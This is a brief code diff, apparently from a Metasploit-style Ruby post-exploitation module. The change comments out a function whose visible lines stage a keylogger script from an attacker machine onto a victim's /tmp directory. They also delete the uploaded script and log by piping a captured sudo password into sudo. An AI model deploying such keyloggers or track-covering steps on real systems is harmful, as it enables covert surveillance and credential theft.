@@ -1,4 +1,4 @@
-def run_script(client)
+#def run_script(client)
 # Define paths for the keylogger script and log file
 local_keylogger_script = "/home/kali/Documents/keylogger.sh" # Local path on attacker machine
 remote_keylogger_script = "/tmp/keylogger.sh"               # Remote path on victim machine
@@ -48,4 +48,4 @@ end
 print_status("Cleaning up uploaded files...")
 cmd_exec("echo '#{sudo_password}' | sudo -S rm -f #{remote_keylogger_script} #{log_file_path}")
 print_good("Uploaded script and log file cleaned up successfully.")
-end
+#end
